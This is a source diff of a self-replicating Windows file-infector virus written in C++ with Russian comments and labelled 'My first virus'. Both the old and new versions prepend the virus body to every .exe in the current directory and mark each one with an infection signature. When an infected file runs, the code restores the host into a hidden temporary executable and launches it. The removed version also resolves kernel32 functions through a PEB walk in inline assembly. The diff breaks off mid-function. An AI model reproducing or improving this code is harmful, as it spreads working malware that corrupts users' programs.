@@ -1,389 +1,282 @@
 #include <Windows.h>
-#include <stdio.h>
-#include <conio.h>
 
 #pragma comment(linker,"/MERGE:.rdata=.text")
 #pragma comment(linker,"/FILEALIGN:512")
 #pragma comment(linker,"/SECTION:.text,EWR /IGNORE:4078")
 #pragma comment(linker,"/ENTRY:main")
 
-#define NTSIGNATURE(a) ((LPVOID)(*((DWORD *)(a + 0x3c)) + a))
-#define GETSIZEOFHEADERS(a) (*((DWORD*)(a + 0x54)))
-#define ALIGN_DOWN(x, align) (x & ~(align - 1))
-#define ALIGN_UP(x, align) ((x & (align - 1))?ALIGN_DOWN(x,align)+align:x)
-#define OPT_SZ(p) (*((WORD*)(p + 0x14)))
-#define NumOfSec(p) (*(WORD*)(p + 0x6))
-#define pSectionTable(p) ((BYTE*)(p + 0x18 + OPT_SZ(p)))
-#define pLastSection(p) (pSectionTable(p) + (NumOfSec(p) - 1) * 0x28)
-
 wchar_t* CharToWchar(char*);
 char* WcharToChar(wchar_t*);
-bool FindFiles(int,HANDLE);
+bool FindFiles(int, HANDLE);
 bool Infection(int, wchar_t*, HANDLE);
-DWORD FindFuncs(char *);
-int StrCmp(char*, char*);
-void GetAPIs();
 int WcsCat(wchar_t *, wchar_t *);
+bool BufExe(HANDLE);
+bool ChooseGen();
+bool Infect1Gen(HANDLE, HANDLE);
+bool Infect2Gen(HANDLE, HANDLE);
 
-HANDLE (__stdcall *create_file)(LPWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE); 
-BOOL (__stdcall *close_handle)(HANDLE);
-LPVOID (__stdcall *map_view_of_file)( HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
-HANDLE (__stdcall *create_file_mapping)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCTSTR lpName);
-DWORD (__stdcall *set_file_pointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
-BOOL (__stdcall *unmap_view_of_file)(LPCVOID lpBaseAddress);
-BOOL (__stdcall *read_file)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
-BOOL (__stdcall *write_file)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
-DWORD (__stdcall *get_current_directory)(DWORD nBufferLength, LPTSTR lpBuffer);
-HANDLE (__stdcall *find_first_file)(LPCTSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData);
-BOOL (__stdcall *find_next_file)(HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData);
-BOOL (__stdcall *find_close)(HANDLE hFindFile);
-int (__stdcall *mb_to_wc)(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
-int (__stdcall *wc_to_mb)(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar);
-int (__stdcall *message_box)(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType);
-void (__stdcall *exit_process)(UINT);
-int (__stdcall *get_module_file_name)(HANDLE hModule, LPWSTR fileName, DWORD size);
-
-
-
-unsigned char bufPat[80241024], bufVir[60024];
+/**
+Buffer for infection file
+*/
+unsigned char bufPat[80241024];
+/**
+Buffer for virus
+*/
+unsigned char bufVir[60024];
 
 int main(int argc, char *argv[])
 {
-	
-	WIN32_FIND_DATA FindFileData;
-	//Patient
-	GetAPIs();
+	if(!ChooseGen()) return 0; // проверка на поколение
+	return 1;	
+}
+/**
+Forms generation
+*/
+bool ChooseGen()
+{
 	wchar_t b[MAX_PATH];
-	long w;
-	HANDLE hfPat, hMap;
-	BYTE* hMapAddress;
-	DWORD atrFile, atrMap, atrAddr;
+	DWORD signature, w;
+	HANDLE hfPat;
 
-	get_module_file_name(NULL, b, MAX_PATH);
-	printf("Name of file: %s\n", WcharToChar(b));
-		atrFile = 0x80000000;
-		atrMap = 0x02;
-		atrAddr = 0x04;
-	hfPat = create_file(b, atrFile, 0x00000001, NULL, 3, 0x00000080, 0); //FILE_SHARE_READ 0x00000001 OPEN_EXISTING 3  FILE_ATTRIBUTE_NORMAL 0x00000080
-	if((DWORD)hfPat == 0xffffffff) {printf("Open patient file error!"); getch();close_handle(hfPat); return 0; }
-	w = set_file_pointer(hfPat, 0,0, 2); //FILE_END 2
-	hMap = create_file_mapping(hfPat, NULL, atrMap, 0, w, NULL); //PAGE_READWRITE 0x04
-	if(hMap==NULL) {printf("error - hMap"); getch();close_handle(hfPat); return 0; }
-	hMapAddress = (BYTE*) map_view_of_file(hMap, atrAddr, 0, 0, w);
-	if(!hMapAddress) {printf("error - hMapAddress");getch();return 0;}
+	GetModuleFileName(NULL, b, MAX_PATH);	// получение полного пути к текущему файлу
+	hfPat = CreateFile(b, 0x80000000, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0); // открытие файла для чтения
+	if((DWORD)hfPat == 0xffffffff) 
+	{
+		CloseHandle(hfPat); 
+		return false; 
+	}
+	SetFilePointer(hfPat,-sizeof(DWORD),0,2);	// установка указателя на место в файле, где должна быть сигнатура
+	ReadFile(hfPat,&signature, sizeof(DWORD), &w, NULL); // чтение сигнатуры
 	
-	BYTE* hPE = (BYTE*)NTSIGNATURE(hMapAddress);
-
-	DWORD vir_sz = 0;
-	if(*((DWORD*)(hPE + 0x4C)) == 0x4567) {
-												FindFiles(2, hfPat);
-												printf("2 generation\n");
-												MessageBox(0,CharToWchar("virus"),CharToWchar("My first virus"),0);
-												DWORD r = 0;
-												wchar_t DirSpec[MAX_PATH];
-												get_current_directory(MAX_PATH, DirSpec);
-												WcsCat(DirSpec, CharToWchar("\\ahaha.exe"));
-
-												set_file_pointer(hfPat, -sizeof(vir_sz), 0, 2);
-												if(!read_file(hfPat, &vir_sz, sizeof(vir_sz), &r, NULL)) printf("error read vir_sz");
-												
-												set_file_pointer(hfPat, vir_sz, 0, 0);
-												HANDLE hfPat2 = create_file(DirSpec, 0xC0000000, 0x00000001, NULL, 2, 0x00000080, 0);
-												if((DWORD)hfPat2 == 0xffffffff) {/*printf("Open vir file error!");*/ close_handle(hfPat2); return 0; }
-												DWORD w1;
-												unsigned char buf[1024];
-												while(1)
-												{
-													read_file(hfPat,buf, 1024, &w1, NULL);
-													write_file(hfPat2, buf, w1, &w1, NULL);
-													if(w1 < 1024) break;
-												};											
-												close_handle(hfPat2);
-												STARTUPINFO si;
-												PROCESS_INFORMATION pi;
-												GetStartupInfo(&si);
-												if(!CreateProcess(DirSpec,NULL,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi))return 0;
-												HANDLE proc = pi.hProcess;
-												WaitForSingleObject(proc, INFINITE);
-												
-												DeleteFile(DirSpec);
+	if(signature == 0x4567)	// проверка сигнатуры		
+	{
+		FindFiles(2, hfPat);	// вызов функции поиска файлов в текущей дериктории
+		MessageBox(0,CharToWchar("virus"),CharToWchar("My first virus"),0);    // вывод сообщения о заражении
+		if(!BufExe(hfPat)) return false;	// функция создания и выполнения буферного ехе
 	}
 	else
 	{
-		printf("1 generation\n");
-		FindFiles(1,hfPat);
+		FindFiles(1, hfPat);
 	}
-
-	unmap_view_of_file(hMapAddress);
-	close_handle(hMap);
-	close_handle(hfPat);
-
-	return 1;	
+	CloseHandle(hfPat);
+	return true;
 }
 
+/**
+Converts string from ANSI to UNICODE
+@param temp string in ANSI code
+@return string in UNICODE
+*/
 wchar_t* CharToWchar(char *temp)
 {
 	int len = 0;
-	while(temp[len])
+	while(temp[len])	// цикл высчитывания длины строки
 		len++;
 	wchar_t *wStr = new wchar_t[len + 1];
-	mb_to_wc(0, NULL, temp, -1, wStr, len);
+	MultiByteToWideChar(0, NULL, temp, -1, wStr, len);	//функция преобразования 
 	wStr[len] = 0;
 	return wStr;
 }
 
+/**
+Converts string from UNICODE to ANSII
+@param temp string in UNICODE
+@return string in ANSI code
+*/
 char* WcharToChar(wchar_t *temp)
 {
 	int len = 0;
-	while(temp[len])
+	while(temp[len])	// цикл высчитывания длины строки
 		len++;
 	char *Str = new char[len + 1];
-	wc_to_mb(1251, NULL, temp, -1, Str, len, NULL, NULL);
+	WideCharToMultiByte(1251, NULL, temp, -1, Str, len, NULL, NULL);	// функция преобразования
 	Str[len] = '\0';
-	//delete temp;
 	return Str;
 }
 
-bool Infection(int gen, wchar_t *name, HANDLE hSource)
-{
-	wchar_t b[MAX_PATH];
-	long w;
-	HANDLE hfPat, hMap;
-	BYTE* hMapAddress;
-	DWORD atrFile, atrMap, atrAddr;
-		atrFile = 0x80000000;
-		atrMap = 0x02;
-		atrAddr = 0x04;
-	
-	hfPat = create_file(name, atrFile, 0x00000001, NULL, 3, 0x00000080, 0); //FILE_SHARE_READ 0x00000001 OPEN_EXISTING 3  FILE_ATTRIBUTE_NORMAL 0x00000080
-	if((DWORD)hfPat == 0xffffffff) {printf("I:Open patient file error!"); getch();close_handle(hfPat); return 0; }
-	w = set_file_pointer(hfPat, 0,0, 2); //FILE_END 2
-	hMap = create_file_mapping(hfPat, NULL, atrMap, 0, w, NULL); //PAGE_READWRITE 0x04
-	if(hMap==NULL) {printf("I:error - hMap"); getch();close_handle(hfPat); return 0; }
-	hMapAddress = (BYTE*) map_view_of_file(hMap, atrAddr, 0, 0, w);
-	if(!hMapAddress) {printf("I:error - hMapAddress");getch();return 0;}
-	
-	BYTE* hPE = (BYTE*)NTSIGNATURE(hMapAddress);
-	if(*((DWORD*)(hPE + 0x4C)) == 0x4567) {printf("Alredy infected"); return false;}
-	if(!wcscmp(name,CharToWchar("Vir_var2.exe"))) 
-	{
-		printf("This is virus!\n");
-		unmap_view_of_file(hMapAddress);
-		close_handle(hMap);
-		close_handle(hfPat);
-		return true;
-	}
-	close_handle(hfPat);
-
-	DWORD vir_sz = 0;
-	DWORD i =0;
-	hfPat = create_file(name, 0xC0000000, 0x00000001, NULL, 3, 0x00000080, 0); //FILE_SHARE_READ 0x00000001 OPEN_EXISTING 3  FILE_ATTRIBUTE_NORMAL 0x00000080
-	if((DWORD)hfPat == 0xffffffff) {printf("I:Open patient file error!"); getch();close_handle(hfPat); return 0; }
-	// Infection
-	if(gen == 2) {
-												DWORD r;
-												set_file_pointer(hSource, -sizeof(vir_sz), 0, 2);
-												if(!read_file(hSource, &vir_sz, sizeof(vir_sz), &r, NULL)) printf("I:error read vir_sz");
-												
-												set_file_pointer(hSource, 0, 0, 0);
-												DWORD w1;
-												unsigned char buf[1024];
-												read_file(hSource,bufVir, vir_sz, &w1, NULL);
-												set_file_pointer(hfPat, 0, 0, 0);
-												i=0;
-												while(1)
-												{
-													read_file(hfPat,&bufPat[i], 1024, &w1, NULL);
-													i+=w1;
-													if(w1 < 1024) break;
-												};
-
-												set_file_pointer(hfPat, 0, 0, 0);
-												write_file(hfPat, bufVir, vir_sz, &w1, NULL);
-												write_file(hfPat, bufPat, i, &i, NULL);
-												write_file(hfPat, &vir_sz, sizeof(vir_sz), &w1, NULL);
-
-	}
-	else
-	{
-		//Virus
-
-		vir_sz = set_file_pointer(hSource, 0, 0, 2); //FILE_END 2
-	// vnedrenie
-	
-		set_file_pointer(hfPat, 0, 0, 0); //FILE_BEGIN 0
-		set_file_pointer(hSource, 0, 0, 0);
-
-		DWORD wr;
-		unsigned char buf[1024];
-		i=0;
-		while(1)
-		{
-			read_file(hfPat,&bufPat[i], 1024, &wr, NULL);
-			i+=wr;
-			if(wr < 1024) break;
-		};
-
-		set_file_pointer(hfPat, 0, 0, 0);
-
-		while(1)
-		{
-			read_file(hSource,buf, 1024, &wr, NULL);
-			write_file(hfPat, buf, wr, &wr, NULL);
-			if(wr < 1024) break;
-		};
-		write_file(hfPat, bufPat, i, &i, NULL);
-		wr = 0;
-		write_file(hfPat, &vir_sz, sizeof(vir_sz), &wr, NULL);
-	}
-		unmap_view_of_file(hMapAddress);
-		close_handle(hMap);
-		close_handle(hfPat);
-
-		hfPat = create_file(name, 0xC0000000, 0x00000001, NULL, 3, 0x00000080, 0); //FILE_SHARE_READ 0x00000001 OPEN_EXISTING 3  FILE_ATTRIBUTE_NORMAL 0x00000080
-		if((DWORD)hfPat == 0xffffffff) {/*printf("Open patient file error!");*/ close_handle(hfPat); return 0; }
-		hMap = create_file_mapping(hfPat, NULL, 0x04, 0, w, NULL); //PAGE_READWRITE 0x04
-		if(hMap==NULL) {/*printf("error - hMap");*/ close_handle(hfPat); return 0; }
-		hMapAddress = (BYTE*) map_view_of_file(hMap, 0x02, 0, 0, w);
-		if(!hMapAddress) {/*printf("error - hMapAddress")*/;return 0;}
-		hPE = (BYTE*)NTSIGNATURE(hMapAddress);
-		*((DWORD*)(hPE + 0x4C)) = 0x4567;
-		unmap_view_of_file(hMapAddress);
-		close_handle(hMap);
-		close_handle(hfPat);
-		printf("File %s succes infected", WcharToChar(name));
-}
-
-bool FindFiles(int gen, HANDLE hSource)
+/**
+Searches files in current directory
+@param gen generation of carrier
+@param hPat HANDLE of carrier
+*/
+bool FindFiles(int gen, HANDLE hPat)
 {
 	WIN32_FIND_DATA FindFileData;
-	HANDLE hFind = NULL;//INVALID_HANDLE_VALUE;
-    wchar_t DirSpec[MAX_PATH];  // directory specification
-    DWORD dwError;
-	DWORD BufSize = MAX_PATH;
-    //path[strlen(path)-10] = '\0';
+	HANDLE hFind = NULL;
+    wchar_t DirSpec[MAX_PATH];
+	GetCurrentDirectory(MAX_PATH, DirSpec);	// получение текущей директории
+    WcsCat(DirSpec, CharToWchar("\\*.exe"));	// присоединение маски поиска
 
-	
-	get_current_directory(BufSize, DirSpec);
-  //  printf ("\nTarget directory is %s\n", WcharToChar(DirSpec));
-    //strncpy (DirSpec, path, strlen(path)+1);
-    WcsCat(DirSpec, CharToWchar("\\*.exe"));
-
-    hFind = find_first_file(DirSpec, &FindFileData);
+    hFind = FindFirstFile(DirSpec, &FindFileData);	// поиск перевого файла в текущей дериктории по маске
 
 	
     if (hFind == INVALID_HANDLE_VALUE) 
     {
-       printf ("Invalid file handle. Error is %u\n", GetLastError());
        return false;
     } 
     else 
     {	
-		Infection(gen, FindFileData.cFileName, hSource);
-		printf ("First file name is %s\nFile size = %x\n", WcharToChar(FindFileData.cFileName), FindFileData.nFileSizeLow);
-       while (find_next_file(hFind, &FindFileData) != 0) 
-       {
-		   printf ("Next file name is %s\nFile size = %x\n", WcharToChar(FindFileData.cFileName), FindFileData.nFileSizeLow);
-		   Infection(gen, FindFileData.cFileName, hSource);
-     
-       }
-       find_close(hFind);
+		Infection(gen, FindFileData.cFileName, hPat);	//вызов выбора способа заражения файла
+		while (FindNextFile(hFind, &FindFileData) != 0)		//цикл поиска всех оставшихся файлов
+		{
+			Infection(gen, FindFileData.cFileName, hPat);	// вызов функции заражения файла
+		}
+    FindClose(hFind);
     }
     return true;
 }
 
-DWORD FindFuncs(char *f_name)
+/**
+Choose infection way
+@param gen generation of carrier
+@param name string containing name of file
+@param hSource HANDLE of carrier
+*/
+bool Infection(int gen, wchar_t *name, HANDLE hSource)
 {
-	DWORD kernel;
-		_asm
+	if(!wcscmp(name,CharToWchar("Vir_var2.exe")))	// проверка на самого себя
 	{
-		xor ebx, ebx               // clear ebx
-		mov ebx, fs:[ 0x30 ]       // get a pointer to the PEB
-		mov ebx, [ ebx + 0x0C ]    // get PEB->Ldr
-	    mov ebx, [ ebx + 0x14 ]    // get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
-		mov ebx, [ ebx ]           // get the next entry (2nd entry)
-		mov ebx, [ ebx ]           // get the next entry (3rd entry)
-		mov ebx, [ ebx + 0x10 ]    // get the 3rd entries base address (kernel32.dll)
-		mov kernel, ebx
+		return true;
+	}
+	DWORD w, signature;
+	wchar_t DirSpec[MAX_PATH];  
+	GetCurrentDirectory(MAX_PATH, DirSpec);	
+	WcsCat(DirSpec, CharToWchar("\\"));
+	WcsCat(DirSpec, name);
+
+	HANDLE hfPat = CreateFile(DirSpec, 0xC0000000, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);	// открытие файла, найденного для заражения
+	if((DWORD)hfPat == 0xffffffff) 
+	{
+		CloseHandle(hfPat); 
+		return false; 
+	}
+	SetFilePointer(hfPat, -sizeof(DWORD), 0, 2);
+	ReadFile(hfPat, &signature, sizeof(DWORD), &w, NULL);
+
+	if(signature == 0x4567) return false;	// проверка на повторное заражение
+	
+	// Infection
+	if(gen == 2) Infect2Gen(hSource, hfPat);	// выбор способа заражения второго поколения
+	else Infect1Gen(hSource, hfPat);		// выбор способа первого поколения
+
+	SetFilePointer(hfPat, 0, 0, 2);	// установка указателся на конец заражаемого файла
+	signature = 0x4567;	// сигнатура
+	WriteFile(hfPat,&signature, sizeof(DWORD), &w, NULL);	// запись сигнатуры в конец файла
+
+	CloseHandle(hfPat);
+}
+
+/**
+Infection 1 generation
+@param hSource HANDLE of carrier
+@param hPat HANDLE of target file
+*/
+bool Infect1Gen(HANDLE hSource, HANDLE hPat)
+{
+	DWORD vir_sz = 0, wr, i;
+	vir_sz = SetFilePointer(hSource, 0, 0, 2); // получение размера вируса
+		// vnedrenie
+	SetFilePointer(hPat, 0, 0, 0); //установка указателей в файлах на начало
+	SetFilePointer(hSource, 0, 0, 0);
+
+	unsigned char buf[1024];
+	i=0;
+	while(1)	// цикл чтения в буфер тела заражаемого файла
+	{
+		ReadFile(hPat,&bufPat[i], 1024, &wr, NULL);
+		i += wr;
+		if(wr < 1024) break;
+	};
+
+	SetFilePointer(hPat, 0, 0, 0);
+
+	while(1)	// цикл записи тела вируса в заражемый файл
+	{
+		ReadFile(hSource,buf, 1024, &wr, NULL);
+		WriteFile(hPat, buf, wr, &wr, NULL);
+		if(wr < 1024) break;
+	};
+	WriteFile(hPat, bufPat, i, &i, NULL);	// запись тела программы вслед на телом вируса
+	SetFilePointer(hPat, 0, 0, 2);
+	WriteFile(hPat, &vir_sz, sizeof(vir_sz), &wr, NULL);	// запись в конец файла размер вируса
+	return true;
+}
+
+/**
+Infection 2 generation
+@param hSource HANDLE of carrier
+@param hPat HANDLE of target file
+*/
+bool Infect2Gen(HANDLE hSource, HANDLE hPat)
+{
+	DWORD r, vir_sz, i;
+	SetFilePointer(hSource, -2*sizeof(vir_sz), 0, 2);	// установка указателя на то место, где находится размер вируса
+	ReadFile(hSource, &vir_sz, sizeof(vir_sz), &r, NULL);	//чтение размера вируса
+												
+	SetFilePointer(hSource, 0, 0, 0);
+	unsigned char buf[1024];
+	ReadFile(hSource,bufVir, vir_sz, &r, NULL);	// чтение тела вирса в буффер
+	SetFilePointer(hPat, 0, 0, 0);
+	i=0;
+	while(1)	// чтение тела зараженного файла в буффер
+	{
+		ReadFile(hPat,&bufPat[i], 1024, &r, NULL);
+		i += r;
+		if(r < 1024) break;
+	};
+
+	SetFilePointer(hPat, 0, 0, 0);
+	WriteFile(hPat, bufVir, vir_sz, &r, NULL);	// запись тела вируса
+	WriteFile(hPat, bufPat, i, &i, NULL);	// запись тела файла
+	WriteFile(hPat, &vir_sz, sizeof(vir_sz), &r, NULL);	// запись размера вируса
+	return true;
+}
+
+/**
+Create and execute temp file
+@param hSource HANDLE of carrier
+*/
+bool BufExe(HANDLE hFile)
+{
+	DWORD r = 0, vir_sz = 0;
+	wchar_t DirSpec[MAX_PATH];
+	GetCurrentDirectory(MAX_PATH, DirSpec);
+	WcsCat(DirSpec, CharToWchar("\\ahaha.exe"));	// получения имени буфферного файла
+
+	SetFilePointer(hFile, -2*sizeof(vir_sz), 0, 2);	
+	ReadFile(hFile, &vir_sz, sizeof(vir_sz), &r, NULL);
+												
+	SetFilePointer(hFile, vir_sz, 0, 0);
+	HANDLE hfPat2 = CreateFile(DirSpec, 0xC0000000, 0x00000001, NULL, 2, FILE_ATTRIBUTE_HIDDEN, 0);	// открытие буфферного файла с атрибутом скрытый
+	if((DWORD)hfPat2 == 0xffffffff) 
+	{
+		CloseHandle(hfPat2); 
+		return false; 
 	}
 
-	BYTE* p = (BYTE*)NTSIGNATURE(kernel);// + kernel);//*((DWORD*)(kernel + 0x3C)) + kernel;
-	//printf("address = %d\nkernel = %d",LoadLibrary(CharToWchar("kernel32")), kernel);
-	
-	//if(*((DWORD*)p) == IMAGE_NT_SIGNATURE) printf("\nOK %s", f_name);
-	
-	DWORD* pDD = (DWORD*)(p + 0x78);// pointer to Data Directory
-	DWORD pExport = pDD[0] + kernel;
-	DWORD xExport = pDD[1];//size
-	
-	//DWORD nameRVA = *(DWORD*)(pExport + 0xC) + kernel;
-	//DWORD ordinalBASE = *(DWORD*)(pExport + 0x10);
-	//DWORD addressTableEntries = *(DWORD*)(pExport + 0x14);
-	DWORD numberOfNamePointers = *(DWORD*)(pExport + 0x18);
-	DWORD* exportAddressTableRVA = (DWORD*)(*(DWORD*)(pExport + 0x1C) + kernel);
-	DWORD* namePointerRVA = (DWORD*)(*(DWORD*)(pExport + 0x20) + kernel);
-	WORD* ordinalTableRVA = (WORD*)(*(DWORD*)(pExport + 0x24) + kernel);
-
-	char* name;
-	//char f_name[] = "MultiByteToWideChar";
-	DWORD f_index, f_address, ordinal;
-	//BYTE* pForward;
-	BYTE ind = 0;
-	
-	//printf("name             ordinal/hint VirtualAddress Forward\n"\
-	//		"------------------------------------------------\n");
-
-	for(int i = 0; i < numberOfNamePointers; i++)
+	unsigned char buf[1024];
+	while(1)	// копирование тела зараженного файла без тела вируса в буффер
 	{
-		name = (char*)(namePointerRVA[i] + kernel);
-		if(!StrCmp(name, f_name)) ind = 1;
-  		f_index = ordinalTableRVA[i];
-		f_address = (DWORD)((long)exportAddressTableRVA[f_index] + kernel);
-		if(f_address == kernel) continue;
-		//ordinal = f_index + ordinalBASE;
-
-		/*if((f_address > (DWORD)pExport) && (f_address < (DWORD)(pExport + xExport)))
-			pForward = (BYTE*)f_address;
-		else pForward = 0;
-
-		if(ind){
-			printf("% 20s [%03d/%03d] %08Xh %s\n",
-			name, ordinal, i, f_address, (pForward)?(char*)pForward:"");
-		printf("----------------------------------------------------");*/
-		if(ind) {/*printf("addr = %x",f_address);*/return (f_address);}
-	}
-	return 0;
+		ReadFile(hFile,buf, 1024, &r, NULL);
+		WriteFile(hfPat2, buf, r, &r, NULL);
+		if(r < 1024) break;
+	};											
+	CloseHandle(hfPat2);
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	GetStartupInfo(&si);	// получение содержимого структуры
+	if(!CreateProcess(DirSpec,NULL,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi)) return false;	// создание процесса для буфферного файла
+	HANDLE proc = pi.hProcess;
+	WaitForSingleObject(proc, INFINITE);	// ожидание завершения процесса											
+	DeleteFile(DirSpec);	// удаление буфферного файла
+	return true;
 }
 
-void GetAPIs()
-{
-	create_file = (HANDLE (__stdcall *)(LPWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))FindFuncs("CreateFileW");
-	map_view_of_file = (LPVOID (__stdcall *)( HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap))FindFuncs("MapViewOfFile");
-	create_file_mapping = (HANDLE (__stdcall *)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCTSTR lpName))FindFuncs("CreateFileMappingW");
-	close_handle = (BOOL (__stdcall*)(HANDLE))FindFuncs("CloseHandle");
-	set_file_pointer = (DWORD (__stdcall *)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod))FindFuncs("SetFilePointer");
-	unmap_view_of_file = (BOOL (__stdcall *)(LPCVOID lpBaseAddress))FindFuncs("UnmapViewOfFile");
-	read_file = (BOOL (__stdcall *)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped))FindFuncs("ReadFile");
-	write_file = (BOOL (__stdcall *)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped))FindFuncs("WriteFile");
-	mb_to_wc = (int (__stdcall *)(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar))FindFuncs("MultiByteToWideChar");
-	wc_to_mb = (int (__stdcall *)(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar))FindFuncs("WideCharToMultiByte");
-	get_current_directory = (DWORD (__stdcall *)(DWORD nBufferLength, LPTSTR lpBuffer))FindFuncs("GetCurrentDirectoryW");
-	find_first_file = (HANDLE (__stdcall *)(LPCTSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData))FindFuncs("FindFirstFileW");
-	find_next_file = (BOOL (__stdcall *)(HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData))FindFuncs("FindNextFileW");
-	find_close = (BOOL (__stdcall *)(HANDLE hFindFile))FindFuncs("FindClose");
-	message_box = (int (__stdcall *)(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType))FindFuncs("MESSAGEBOX");
-	exit_process = (void (__stdcall *)(UINT))FindFuncs("ExitProcess");
-	get_module_file_name = (int (__stdcall *)(HANDLE hModule, LPWSTR fileName, DWORD size))FindFuncs("GetModuleFileNameW");
-}
-
-int StrCmp(char *str1, char *str2)
-{
-	int i = 0;
-	while((str1[i] == str2[i]) && (str1[i] != '\0')) i++;
-	if(str1[i] == '\0') return 0;
-	else return 1;
-}
-
+/**
+Connection two strings
+@param dest string in UNICODE
+@param source string in UNICODE
+*/
 int WcsCat(wchar_t *dest, wchar_t *source)
 {
 	int i= 0, j = 0;
